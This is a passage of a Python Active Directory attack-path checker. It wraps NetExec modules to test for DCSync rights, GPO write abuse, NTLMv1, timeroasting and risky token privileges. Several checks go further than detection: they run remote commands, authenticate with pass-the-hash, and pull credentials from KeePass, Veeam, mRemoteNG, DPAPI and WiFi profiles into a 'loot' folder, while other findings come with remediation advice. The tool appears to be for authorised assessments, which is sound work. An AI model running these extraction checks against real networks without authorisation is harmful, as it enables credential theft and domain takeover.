    domain_dn = "DC=" + domain.replace(".", ",DC=")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M daclread -o TARGET_DN='{domain_dn}' ACTION=read RIGHTS=DCSync",
        timeout=60,
    )
    log(f"DCSync rights output:\n{out}", "info")

    expected = {"domain admins", "enterprise admins", "administrators",
                "domain controllers", "enterprise domain controllers"}
    suspicious = []
    for line in out.splitlines():
        if "GetChangesAll" in line or "DS-Replication-Get-Changes-All" in line:
            m = re.search(r"(CN=[\w\s\-]+)", line, re.IGNORECASE)
            if m:
                name = m.group(1).lower().replace("cn=", "")
                if not any(e in name for e in expected):
                    suspicious.append(m.group(1))

    if suspicious:
        log(f"Non-standard DCSync rights found: {suspicious}", "good")
        store("DCSync Rights (Non-Standard)",
              f"VULNERABLE — {len(suspicious)} unexpected principal(s) with DCSync",
              out.strip(),
              "Remove GetChangesAll from non-DA/EA/DC accounts. "
              "Monitor for new replication rights grants via audit policy.")
    else:
        store("DCSync Rights (Non-Standard)", "NOT FOUND — Only expected groups have DCSync",
              out.strip())


def check_gpo_abuse(dc_ip, username, password, domain, nh=""):
    """
    Enhanced GPO abuse check — enumerate GPOs writable by non-admins,
    then cross-reference with OU scope to identify affected machines/users.
    """
    section("PrivEsc: GPO Write Abuse (Scoped)")
    log("Enumerating writable GPOs and their OU scope...")

    # Get all GPOs with their linked OUs
    out_gpo = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=groupPolicyContainer)' "
        f"'cn displayName gPCFileSysPath'",
        timeout=30,
    )
    log(f"GPO enumeration:\n{out_gpo}", "info")

    # Check DACL on each GPO path (NXC daclread on GPO containers)
    _gpo_dn = 'CN=Policies,CN=System,DC=' + domain.replace('.', ',DC=')
    out_dacl = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M daclread -o TARGET_DN='{_gpo_dn}' "
        f"ACTION=read",
        timeout=45,
    )
    log(f"GPO DACL output:\n{out_dacl}", "info")

    combined = out_gpo.strip() + "\n\n" + out_dacl.strip()

    if ("CreateChild" in out_dacl or "GenericWrite" in out_dacl or
            "WriteDacl" in out_dacl or "GenericAll" in out_dacl):
        store("GPO Write Abuse",
              "VULNERABLE — Write access on GPO container or GPO objects",
              combined,
              "Restrict GPO create/edit rights to Domain Admins only. "
              "Audit who can write to GPO file paths in SYSVOL. "
              "Use BloodHound GPO attack paths to identify affected OUs.")
    else:
        store("GPO Write Abuse", "NOT FOUND", combined)


def check_badsuccessor(dc_ip, username, password, domain, nh=""):
    """
    BadSuccessor — NXC module that detects delegated OU admin escalation to DA.
    Abuses the ability for delegated OU creators to inherit excessive permissions.
    """
    section("PrivEsc: BadSuccessor (Delegated OU Admin → DA)")
    log("Running badsuccessor NXC module...")

    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M badsuccessor",
        timeout=60,
    )
    log(f"BadSuccessor output:\n{out}", "info")

    if "VULNERABLE" in out.upper() or ("[+]" in out and "badsuccessor" in out.lower()):
        store("BadSuccessor (Delegated OU Escalation)",
              "VULNERABLE",
              out.strip(),
              "Audit OU delegations. Remove CreateChild rights on OU objects from non-admin users. "
              "Apply May 2025 security update (ADV250003).")
    else:
        store("BadSuccessor (Delegated OU Escalation)", "NOT VULNERABLE", out.strip())


def check_ntlmv1(dc_ip, username, password, domain, subnet, nh=""):
    """
    Detect hosts accepting NTLMv1 authentication — trivially crackable with crack.sh.
    """
    section("PrivEsc: NTLMv1 Accepted")
    target = subnet if subnet else dc_ip
    log(f"Checking for NTLMv1 acceptance on {target}...")

    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' -M ntlmv1",
        timeout=90,
    )
    log(f"NTLMv1 output:\n{out}", "info")

    hits = [l for l in out.splitlines() if "NTLMV1" in l.upper() and "[+]" in l]
    if hits:
        store("NTLMv1 Accepted",
              f"VULNERABLE — {len(hits)} host(s) accept NTLMv1",
              out.strip(),
              "Enforce NTLMv2-only via GPO: Network security: LAN Manager authentication level "
              "= 'Send NTLMv2 response only. Refuse LM & NTLM'. "
              "NTLMv1 responses are crackable to NTLM hash via crack.sh.")
    else:
        store("NTLMv1 Accepted", "NOT FOUND", out.strip())


def check_timeroast(dc_ip, username, password, domain, nh=""):
    """
    Timeroasting — computer accounts with weak RC4 Kerberos keys, exploitable
    without requiring any existing session (unauthenticated RC4 Kerberos ticket request).
    """
    section("PrivEsc: Timeroasting (Weak Computer Account RC4 Keys)")
    log("Running timeroast NXC module...")

    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M timeroast",
        timeout=60,
    )
    log(f"Timeroast output:\n{out}", "info")

    if "[+]" in out and ("hash" in out.lower() or "$krb5" in out.lower()):
        store("Timeroasting",
              "VULNERABLE — Computer account RC4 hashes retrieved",
              out.strip(),
              "Set msDS-SupportedEncryptionTypes to 24 (AES128+AES256 only) on all computer accounts. "
              "Rotate passwords on affected computer accounts.")
    else:
        store("Timeroasting", "NOT VULNERABLE", out.strip())


# ═══════════════════════════════════════════════════════════════════════════════
# ── PRIVILEGE ESCALATION — LOCAL / HOST ──────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def check_unquoted_service_paths(dc_ip, username, password, domain, subnet, nh=""):
    """
    Enumerate services with unquoted paths containing spaces — local privesc
    if a lower-privileged user can write to an intermediate path.
    """
    section("PrivEsc: Unquoted Service Paths")
    target = subnet if subnet else dc_ip
    log(f"Checking services for unquoted paths on {target}...")

    # NXC reg-query on the Services key is most reliable
    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M reg-query "
        f"-o PATH='HKLM\\SYSTEM\\CurrentControlSet\\Services' KEY=ImagePath",
        timeout=120,
    )
    log(f"Service paths output:\n{out}", "info")

    # Parse: unquoted = contains space, doesn't start with " or %
    unquoted = []
    for line in out.splitlines():
        m = re.search(r"ImagePath\s*[=:]\s*(.+)", line, re.IGNORECASE)
        if m:
            path = m.group(1).strip()
            if (" " in path and not path.startswith('"')
                    and not path.startswith("%") and ".exe" in path.lower()):
                unquoted.append(path)

    if unquoted:
        store("Unquoted Service Paths",
              f"VULNERABLE — {len(unquoted)} unquoted path(s) found",
              out.strip() + "\n\nUnquoted paths:\n" + "\n".join(unquoted),
              "Wrap all service ImagePath values in double quotes. "
              "Restrict write access to intermediate directories.")
    else:
        store("Unquoted Service Paths", "NOT FOUND", out.strip())


def check_seimpersonate(dc_ip, username, password, domain, nh=""):
    """
    Check if current user has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
    via WinRM execution of whoami /priv. Potato-family attacks apply if found.
    """
    section("PrivEsc: SeImpersonatePrivilege / SeAssignPrimaryToken")
    log("Checking token privileges via WinRM...")

    # Try WinRM first
    out_winrm = run(
        f"nxc winrm {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-x 'whoami /priv'",
        timeout=30,
    )
    log(f"WinRM whoami /priv output:\n{out_winrm}", "info")

    # Fall back to SMB exec
    if not out_winrm.strip() or "FAILED" in out_winrm.upper():
        log("WinRM failed, trying SMB exec...")
        out_winrm = run(
            f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
            f"-x 'whoami /priv'",
            timeout=30,
        )

    priv_flags = {
        "SeImpersonatePrivilege":     "Potato/SweetPotato/GodPotato applicable",
        "SeAssignPrimaryTokenPrivilege": "Potato-family applicable",
        "SeDebugPrivilege":           "Process memory dump / inject into SYSTEM processes",
        "SeBackupPrivilege":          "Read any file including NTDS.dit",
        "SeRestorePrivilege":         "Write to any file including SAM/SYSTEM",
        "SeTakeOwnershipPrivilege":   "Take ownership of any object",
        "SeLoadDriverPrivilege":      "Load arbitrary kernel driver — BYOVD possible",
    }

    found = []
    for priv, note in priv_flags.items():
        if priv in out_winrm and "Enabled" in out_winrm:
            found.append(f"{priv} — {note}")

    if found:
        store("Dangerous Token Privileges",
              f"VULNERABLE — {len(found)} dangerous privilege(s) enabled",
              out_winrm.strip() + "\n\nFound:\n" + "\n".join(found),
              "Review service account privileges. Remove unnecessary SeImpersonate grants. "
              "IIS/MSSQL/PrintSpooler service accounts commonly have SeImpersonate.")
    else:
        store("Dangerous Token Privileges", "NOT FOUND / NOT ACCESSIBLE", out_winrm.strip())


def check_autologon_registry(dc_ip, username, password, domain, subnet, nh=""):
    """
    Check Winlogon registry keys for DefaultPassword (cleartext autologon creds).
    Different from GPP autologin — this is a direct registry value.
    """
    section("PrivEsc: Autologon Registry Credentials (Winlogon)")
    target = subnet if subnet else dc_ip
    log(f"Checking Winlogon registry for DefaultPassword on {target}...")

    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M reg-winlogon",
        timeout=60,
    )
    log(f"Winlogon output:\n{out}", "info")

    if "[+]" in out and ("DefaultPassword" in out or "password" in out.lower()):
        store("Autologon Registry Credentials",
              "FOUND — Cleartext credentials in Winlogon registry",
              out.strip(),
              "Remove DefaultPassword from Winlogon registry key. "
              "Replace autologon with a more secure alternative (GINA, credential manager). "
              "Key: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
    else:
        store("Autologon Registry Credentials", "NOT FOUND", out.strip())


# ═══════════════════════════════════════════════════════════════════════════════
# ── CREDENTIAL EXPOSURE — GAPS ────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def check_dpapi(dc_ip, username, password, domain, subnet, nh=""):
    """
    DPAPI masterkey and blob discovery via NXC dpapi_hash module.
    Identifies readable DPAPI blobs that can be decrypted offline.
    """
    section("Credential Exposure: DPAPI Masterkeys")
    target = subnet if subnet else dc_ip
    log(f"Running DPAPI hash discovery on {target}...")

    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M dpapi_hash",
        timeout=90,
    )
    log(f"DPAPI output:\n{out}", "info")

    if "[+]" in out and ("masterkey" in out.lower() or "dpapi" in out.lower()
                         or "hash" in out.lower()):
        store("DPAPI Masterkeys",
              "FOUND — DPAPI blobs/hashes accessible",
              out.strip(),
              "Restrict access to user profile directories. "
              "DPAPI blobs can be decrypted offline with domain backup key or user password. "
              "Run: impacket-dpapi masterkey -file <blob> -sid <SID> -password <pass>")
    else:
        store("DPAPI Masterkeys", "NOT FOUND / NOT ACCESSIBLE", out.strip())


def check_keepass(dc_ip, username, password, domain, subnet, nh=""):
    """
    KeePass database discovery and trigger-based extraction.
    keepass_discover finds .kdbx files; keepass_trigger attempts credential extraction.
    """
    section("Credential Exposure: KeePass")
    target = subnet if subnet else dc_ip
    log(f"Discovering KeePass databases on {target}...")

    out_discover = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M keepass_discover",
        timeout=90,
    )
    log(f"KeePass discover output:\n{out_discover}", "info")

    if "[+]" in out_discover and ".kdbx" in out_discover.lower():
        log("KeePass database found — attempting trigger extraction...", "good")
        out_trigger = run(
            f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
            f"-M keepass_trigger",
            timeout=60,
        )
        log(f"KeePass trigger output:\n{out_trigger}", "info")
        combined = out_discover.strip() + "\n\n" + out_trigger.strip()
        store("KeePass Databases",
              "FOUND — .kdbx database(s) discovered",
              combined,
              "Restrict access to KeePass database files. "
              "Ensure KeePass trigger export is disabled (KeeFarce/keepass_trigger mitigation). "
              "Use KeePass 2.54+ which patches trigger-based export.")
    else:
        store("KeePass Databases", "NOT FOUND", out_discover.strip())


def check_veeam_creds(dc_ip, username, password, domain, subnet, nh=""):
    """
    Veeam backup credential extraction — Veeam stores backup job credentials
    in its SQL database in a weakly encrypted (reversible) format.
    """
    section("Credential Exposure: Veeam Backup Credentials")
    target = subnet if subnet else dc_ip
    log(f"Checking for Veeam credentials on {target}...")

    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M veeam",
        timeout=60,
    )
    log(f"Veeam output:\n{out}", "info")

    if "[+]" in out and ("password" in out.lower() or "credential" in out.lower()):
        store("Veeam Backup Credentials",
              "FOUND — Veeam credentials extracted",
              out.strip(),
              "Rotate all credentials stored in Veeam immediately. "
              "Use Veeam 12+ with enhanced encryption for stored credentials. "
              "Restrict access to Veeam SQL database.")
    else:
        store("Veeam Backup Credentials", "NOT FOUND", out.strip())


def check_mremoteng_creds(dc_ip, username, password, domain, subnet, nh=""):
    """
    mRemoteNG stored credentials — mRemoteNG stores RDP/SSH passwords
    in confCons.xml encrypted with AES-128 using a default or user-set master password.
    Default master password (mR3m) is trivially broken.
    """
    section("Credential Exposure: mRemoteNG Stored Credentials")
    target = subnet if subnet else dc_ip
    log(f"Checking for mRemoteNG credentials on {target}...")

    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M mremoteng",
        timeout=60,
    )
    log(f"mRemoteNG output:\n{out}", "info")

    if "[+]" in out and ("password" in out.lower() or "confCons" in out):
        store("mRemoteNG Credentials",
              "FOUND — mRemoteNG stored credentials extracted",
              out.strip(),
              "Rotate all credentials stored in mRemoteNG. "
              "Set a strong master password in mRemoteNG (not the default 'mR3m'). "
              "Consider switching to a centralised PAM solution.")
    else:
        store("mRemoteNG Credentials", "NOT FOUND", out.strip())


def check_wifi_passwords(dc_ip, username, password, domain, subnet, nh=""):
    """
    Extract saved WiFi passwords from Windows hosts via NXC wifi module.
    Useful on workstations — PSKs are often reused across environments.
    """
    section("Credential Exposure: WiFi Passwords")
    target = subnet if subnet else dc_ip
    log(f"Extracting saved WiFi passwords from {target}...")

    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M wifi",
        timeout=60,
    )
    log(f"WiFi output:\n{out}", "info")

    if "[+]" in out and ("ssid" in out.lower() or "password" in out.lower()
                         or "psk" in out.lower()):
        store("WiFi Passwords",
              "FOUND — Saved WiFi PSK(s) extracted",
              out.strip(),
              "Review extracted PSKs for password reuse across corporate systems. "
              "Ensure WiFi passwords are unique and rotated regularly.")
    else:
        store("WiFi Passwords", "NOT FOUND", out.strip())



CATEGORY_MAP = {
    "SMB Signing": "Signing & Relay",
    "LDAP Signing": "Signing & Relay",
    "LLMNR / NBT-NS": "Signing & Relay",
    "MachineAccountQuota": "Machine Accounts",
    "noPac CVE-2021-42278/42287": "Machine Accounts",
    "Pre-Win2000 Accounts": "Machine Accounts",
    "Coercion (coerce_plus)": "Coercion",
    "WebClient Service": "Coercion",
    "Print Spooler": "Coercion",
    "LDAPS Port 636": "ADCS",
    "ADCS Discovery": "ADCS",
    "ADCS Templates": "ADCS",
    "ADCS ESC8": "ADCS",
    "Kerberoasting": "Kerberos",
    "AS-REP Roasting": "Kerberos",
    "User Enum (No Creds)": "Kerberos",
    "Duplicate SPNs": "Kerberos",
    "krbtgt Password Age": "Kerberos",
    "Zerologon CVE-2020-1472": "Critical CVEs",
    "EternalBlue MS17-010": "Critical CVEs",
    "Exchange Detected": "Critical CVEs",
    "PrivExchange / Exchange DACL": "Critical CVEs",
    "Unconstrained Delegation": "Delegation",
    "Constrained Delegation": "Delegation",
    "Password Policy": "Credential Exposure",
    "Fine-Grained Password Policies": "Credential Exposure",
    "GPP Passwords": "Credential Exposure",
    "GPP Autologin": "Credential Exposure",
    "LAPS": "Credential Exposure",
    "Passwords in Descriptions": "Credential Exposure",
    "Cleartext LDAP Passwords": "Credential Exposure",
    "Password Not Required": "Credential Exposure",
    "Password Never Expires": "Credential Exposure",
    "gMSA Passwords": "Credential Exposure",
    "Password Spray": "Credential Exposure",
    "User = Password": "Credential Exposure",
    "SAM / LSA Dump": "Credential Exposure",
    "LSA Protection (PPL)": "Credential Exposure",
    "AdminCount Users": "Privileged Groups",
    "Privileged Group Membership": "Privileged Groups",
    "DnsAdmins Group": "Privileged Groups",
    "Backup Operators": "Privileged Groups",
    "SIDHistory": "Privileged Groups",
    "AdminSDHolder ACL": "Privileged Groups",
    "Guest Account": "Privileged Groups",
    "DACL / ACL Abuse": "ACL / GPO",
    "GPO Permissions": "ACL / GPO",
    "IPv6 Enabled": "Network & Services",
    "WinRM Access": "Network & Services",
    "MSSQL Instances": "Network & Services",
    "RDP NLA": "Network & Services",
    "SMBv1 Enabled": "Network & Services",
    "SNMP Community Strings": "Network & Services",
    "LDAP Null Bind": "Network & Services",
    "NFS Exports": "Network & Services",
    "IPMI / BMC": "Network & Services",
    "WSUS Misconfiguration": "Network & Services",
    "SMB Share Enumeration": "Network & Services",
    "Share Spider": "Network & Services",
    "RODC Password Replication": "Network & Services",
    "SMTP Open Relay": "Exposed Services",
    "Redis Unauthenticated": "Exposed Services",
    "Elasticsearch Unauthenticated": "Exposed Services",
    "Jenkins/Tomcat Default Creds": "Exposed Services",
    "MSSQL Linked Servers": "Exposed Services",
    "Domain Trusts": "AD Intelligence",
    "Azure AD Connect": "AD Intelligence",
    "BloodHound Collection": "AD Intelligence",
    "AV/EDR Detection": "AD Intelligence",
    "AlwaysInstallElevated": "AD Intelligence",
    "Local Admin Discovery": "AD Intelligence",
    # Privilege Escalation — AD
    "RBCD — Objects with Delegation Set":      "PrivEsc — AD",
    "Shadow Credentials":                       "PrivEsc — AD",
    "DCSync Rights (Non-Standard)":             "PrivEsc — AD",
    "GPO Write Abuse":                          "PrivEsc — AD",
    "BadSuccessor (Delegated OU Escalation)":   "PrivEsc — AD",
    "NTLMv1 Accepted":                          "PrivEsc — AD",
    "Timeroasting":                             "PrivEsc — AD",
    # Privilege Escalation — Local
    "Unquoted Service Paths":                   "PrivEsc — Local",
    "Dangerous Token Privileges":               "PrivEsc — Local",
    "Autologon Registry Credentials":           "PrivEsc — Local",
    # Credential Exposure (new)
    "DPAPI Masterkeys":                         "Credential Exposure",
    "KeePass Databases":                        "Credential Exposure",
    "Veeam Backup Credentials":                 "Credential Exposure",
    "mRemoteNG Credentials":                    "Credential Exposure",
    "WiFi Passwords":                           "Credential Exposure",
}


def is_vuln(status):
    s = status.upper()
    return (
        "VULNERABLE" in s or "FOUND" in s or "OPEN" in s
        or "RUNNING" in s or "DUMPED" in s or "READABLE" in s
        or "HIT" in s or "MEMBERS" in s or "STALE" in s
        or "WEAK" in s or "SUSPICIOUS" in s or "ENABLED" in s
    ) and "NOT" not in s and "HARDENED" not in s and "ENFORCED" not in s \
      and "BLOCKED" not in s and "SKIPPED" not in s


def is_safe(status):
    s = status.upper()
    return (
        "NOT VULNERABLE" in s or "NOT FOUND" in s or "HARDENED" in s
        or "ENFORCED" in s or "CLOSED" in s or "BLOCKED" in s
        or "EMPTY" in s or "DISABLED" in s or "DEPLOYED" in s
        or "NO HITS" in s or "NOT APPLICABLE" in s
    )


def esc(text):
    return (text.replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))


def generate_report(dc_ip, domain, output_dir):
    ts      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    fname   = f"ad_attack_check_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    outpath = Path(output_dir) / fname
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    vuln_count    = sum(1 for r in results if is_vuln(r["status"]))
    safe_count    = sum(1 for r in results if is_safe(r["status"]))
    unknown_count = len(results) - vuln_count - safe_count

    # Group by category
    categories = {}
    for r in results:
        cat = CATEGORY_MAP.get(r["check"], "Other")
        categories.setdefault(cat, []).append(r)

    def badge(status):
        if is_vuln(status):
            return f'<span class="badge vuln">🔴 {esc(status)}</span>'
        elif is_safe(status):
            return f'<span class="badge safe">🟢 {esc(status)}</span>'
        return f'<span class="badge unk">🟡 {esc(status)}</span>'

    def card_class(status):
        if is_vuln(status):   return "vc"
        if is_safe(status):   return "sc"
        return "ukc"

    def row_class(status):
        return 'class="vr"' if is_vuln(status) else 'class=""'

    # Build overview table rows
    table_rows = ""
    for r in results:
        cat = CATEGORY_MAP.get(r["check"], "Other")
        rec = f'<td class="rec">{esc(r["recommendation"])}</td>' if r["recommendation"] else "<td></td>"
        table_rows += (
            f'<tr {row_class(r["status"])}>'
            f'<td>{esc(r["check"])}</td>'
            f'<td><span class="cat">{esc(cat)}</span></td>'
            f'<td>{badge(r["status"])}</td>'
            f'{rec}</tr>\n'
        )

    # Build detailed findings by category
    detail_html = ""
    for cat, items in categories.items():
        detail_html += f'<h3 class="ch">{esc(cat)}</h3>\n'
        for r in items:
            cc = card_class(r["status"])
            rec_html = (f"<p class='rec'><strong>Recommendation:</strong> {esc(r['recommendation'])}</p>"
                        if r["recommendation"] else "")
            detail_html += (
                f'<div class="card {cc}"><h4>{esc(r["check"])}</h4>'
                f'<p>{badge(r["status"])}</p>{rec_html}'
                f'<details><summary>Evidence</summary>'
                f'<pre>{esc(r["evidence"])}</pre></details></div>\n'
            )

    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
<title>AD Attack Check — {esc(domain)}</title>
<style>
body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;margin:0;padding:0}}
header{{background:#161b22;padding:28px 40px;border-bottom:1px solid #30363d}}
header h1{{color:#58a6ff;margin:0;font-size:1.8em}}
header p{{color:#8b949e;margin:4px 0 0;font-size:.9em}}
.container{{max-width:1200px;margin:0 auto;padding:30px 40px}}
.summary{{display:flex;gap:16px;margin:20px 0}}
.stat{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px 24px;text-align:center;flex:1}}
.stat .num{{font-size:2.4em;font-weight:bold}}
.stat .lbl{{color:#8b949e;font-size:.82em;margin-top:4px}}
.sv .num{{color:#f85149}}.sg .num{{color:#3fb950}}.su .num{{color:#d29922}}
table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;
       overflow:hidden;border:1px solid #30363d;margin:20px 0}}
th{{background:#21262d;color:#8b949e;padding:9px 14px;text-align:left;
    font-size:.78em;text-transform:uppercase;letter-spacing:.08em}}
td{{padding:9px 14px;border-top:1px solid #21262d;font-size:.86em;vertical-align:top}}
tr.vr td{{border-left:3px solid #f85149}}
.badge{{padding:2px 9px;border-radius:12px;font-size:.78em;font-weight:600}}
.badge.vuln{{background:#3d1f1f;color:#f85149;border:1px solid #f85149}}
.badge.safe{{background:#1a2d1a;color:#3fb950;border:1px solid #3fb950}}
.badge.unk{{background:#2d2a1a;color:#d29922;border:1px solid #d29922}}
.cat{{background:#21262d;color:#8b949e;padding:2px 7px;border-radius:4px;font-size:.76em}}
.rec{{color:#8b949e;font-size:.81em}}
.ch{{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:6px;margin-top:28px}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px;margin:10px 0}}
.card h4{{margin:0 0 6px;color:#c9d1d9}}
.vc{{border-left:3px solid #f85149}}.sc{{border-left:3px solid #3fb950}}.ukc{{border-left:3px solid #d29922}}
pre{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;overflow-x:auto;
     font-size:.78em;color:#8b949e;white-space:pre-wrap;word-break:break-all}}
details summary{{cursor:pointer;color:#58a6ff;font-size:.83em;margin-top:6px}}
h2{{color:#c9d1d9;border-bottom:1px solid #30363d;padding-bottom:6px}}
footer{{text-align:center;color:#484f58;padding:18px;font-size:.78em;
        border-top:1px solid #21262d;margin-top:36px}}
</style></head><body>
<header>
  <h1>🔍 AD Attack Path Check Report</h1>
  <p><strong>Target DC:</strong> {esc(dc_ip)} &nbsp;|&nbsp;
     <strong>Domain:</strong> {esc(domain)} &nbsp;|&nbsp;
     <strong>Generated:</strong> {esc(ts)}</p>
</header>
<div class="container">
  <h2>Executive Summary</h2>
  <div class="summary">
    <div class="stat sv"><div class="num">{vuln_count}</div><div class="lbl">Vulnerable / Found</div></div>
    <div class="stat sg"><div class="num">{safe_count}</div><div class="lbl">Hardened / Not Vulnerable</div></div>
    <div class="stat su"><div class="num">{unknown_count}</div><div class="lbl">Unknown / Informational</div></div>
    <div class="stat"><div class="num">{len(results)}</div><div class="lbl">Total Checks</div></div>
  </div>
  <h2>Results Overview</h2>
  <table><thead><tr><th>Check</th><th>Category</th><th>Status</th><th>Recommendation</th></tr></thead>
  <tbody>{table_rows}</tbody></table>
  <h2>Detailed Findings</h2>
  {detail_html}
</div>
<footer>AD Attack Path Checker — {esc(ts)}</footer>
</body></html>"""

    outpath.write_text(html, encoding="utf-8")
    return str(outpath)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    banner()
    p = argparse.ArgumentParser(
        description="AD Attack Path Checker "
    )
    p.add_argument("-dc",      required=True,  dest="dc_ip",   help="Domain controller IP")
    p.add_argument("-u",       required=True,  dest="username", help="Username")
    p.add_argument("-p",       default=None,   dest="password", help="Password (mutually exclusive with -H)")
    p.add_argument("-H",       default=None,   dest="nt_hash",  help="NT hash for Pass-the-Hash (format: NTHASH or LMHASH:NTHASH)")
    p.add_argument("-d",       required=True,  dest="domain",  help="Domain FQDN")
    p.add_argument("-s",       default=None,   dest="subnet",  help="Subnet for host-wide checks (e.g. 10.0.0.0/24)")
    p.add_argument("-o",       default="./loot", dest="output", help="Output directory (default: ./loot)")
    p.add_argument("--skip",   nargs="+",      default=[],     metavar="CHECK",
                   help="Checks to skip (e.g. --skip zerologon ms17010)")
    p.add_argument("--wordlist", default=None,
                   help="Path to username wordlist for kerbrute (overrides auto-detection)")
    args = p.parse_args()

    # Override wordlist search if user provides one
    if args.wordlist:
        WORDLIST_PATHS.insert(0, args.wordlist)

    skips   = [s.lower() for s in args.skip]
    dc_ip   = args.dc_ip
    u       = args.username
    domain  = args.domain
    subnet  = args.subnet

    # Credential validation
    pw = args.password or ""
    nh = args.nt_hash or ""
    if nh:
        # Normalise: accept bare NT hash (32 hex chars) or LMHASH:NTHASH
        if ":" not in nh:
            nh = nh  # NXC accepts bare NT hash with -H
    if not pw and not nh:
        print(f"\n{R}[!] ERROR: Supply either -p <password> or -H <NT hash>{RST}\n")
        sys.exit(1)

    log(f"Target DC : {dc_ip}", "info")
    log(f"Domain    : {domain}", "info")
    log(f"Username  : {u}", "info")
    if nh:
        log(f"Auth      : Pass-the-Hash ({nh[:8]}...)", "warn")
    else:
        log(f"Auth      : Password", "info")
    if subnet:
        log(f"Subnet    : {subnet}", "info")
    if skips:
        log(f"Skipping  : {', '.join(skips)}", "warn")

    # ── Run checks ────────────────────────────────────────────────────────────
    if "smb"         not in skips: check_smb_signing(dc_ip, u, pw, domain, nh)
    if "ldapsign"    not in skips: check_ldap_signing(dc_ip, u, pw, domain, nh)
    if "llmnr"       not in skips: check_llmnr_nbtns(dc_ip, u, pw, domain, nh)
    if "maq"         not in skips: check_maq(dc_ip, u, pw, domain, nh)
    if "nopac"       not in skips: check_nopac(dc_ip, u, pw, domain, nh)
    if "prewin2000"  not in skips: check_pre_win2000(dc_ip, u, pw, domain, nh)
    if "coercion"    not in skips: check_coercion(dc_ip, u, pw, domain, nh)
    if "webdav"      not in skips: check_webdav(dc_ip, u, pw, domain, subnet, nh)
    if "spooler"     not in skips: check_spooler(dc_ip, u, pw, domain, nh)
    if "ldaps"       not in skips: check_ldaps(dc_ip)
    if "adcs"        not in skips: check_adcs(dc_ip, u, pw, domain, nh)
    if "kerberoast"  not in skips: check_kerberoast(dc_ip, u, pw, domain, nh)
    if "asrep"       not in skips: check_asreproast(dc_ip, u, pw, domain, nh)
    if "userenum"    not in skips: check_user_enum(dc_ip, domain, nh)
    if "dupespns"    not in skips: check_duplicate_spns(dc_ip, u, pw, domain, nh)
    if "krbtgt"      not in skips: check_krbtgt_age(dc_ip, u, pw, domain, nh)
    if "zerologon"   not in skips: check_zerologon(dc_ip, u, pw, domain, nh)
    if "ms17010"     not in skips: check_eternalblue(dc_ip, u, pw, nh)
    if "exchange"    not in skips: check_exchange(dc_ip, u, pw, domain, nh)
    if "privexchange" not in skips: check_privexchange(dc_ip, u, pw, domain, nh)
    if "delegation"  not in skips: check_delegation(dc_ip, u, pw, domain, nh)
    if "passpol"     not in skips: check_password_policy(dc_ip, u, pw, domain, nh)
    if "fgpp"        not in skips: check_fgpp(dc_ip, u, pw, domain, nh)
    if "gpp"         not in skips: check_gpp_passwords(dc_ip, u, pw, domain, nh)
    if "gppautologin" not in skips: check_gpp_autologin(dc_ip, u, pw, domain, nh)
    if "laps"        not in skips: check_laps(dc_ip, u, pw, domain, nh)
    if "descriptions" not in skips: check_passwords_in_descriptions(dc_ip, u, pw, domain, nh)
    if "cleartextldap" not in skips: check_cleartext_ldap_passwords(dc_ip, u, pw, domain, nh)
    if "passnoreq"   not in skips: check_password_not_required(dc_ip, u, pw, domain, nh)
    if "passneverexpires" not in skips: check_password_never_expires(dc_ip, u, pw, domain, nh)
    if "gmsa"        not in skips: check_gmsa(dc_ip, u, pw, domain, nh)
    if "spray"       not in skips: check_password_spray(dc_ip, u, pw, domain, nh)
    if "useqpass"    not in skips: check_user_equals_password(dc_ip, u, pw, domain, nh)
    if "samlsa"      not in skips: check_sam_lsa(dc_ip, u, pw, domain, nh)
    if "lsappl"      not in skips: check_lsa_ppl(dc_ip, u, pw, domain, nh)
    if "admincount"  not in skips: check_admincount(dc_ip, u, pw, domain, nh)
    if "privgroups"  not in skips: check_priv_groups(dc_ip, u, pw, domain, nh)
    if "dnsadmins"   not in skips: check_dnsadmins(dc_ip, u, pw, domain, nh)
    if "backupops"   not in skips: check_backup_operators(dc_ip, u, pw, domain, nh)
    if "sidhistory"  not in skips: check_sidhistory(dc_ip, u, pw, domain, nh)
    if "adminsdh"    not in skips: check_adminsdh(dc_ip, u, pw, domain, nh)
    if "guest"       not in skips: check_guest_account(dc_ip, u, pw, domain, nh)
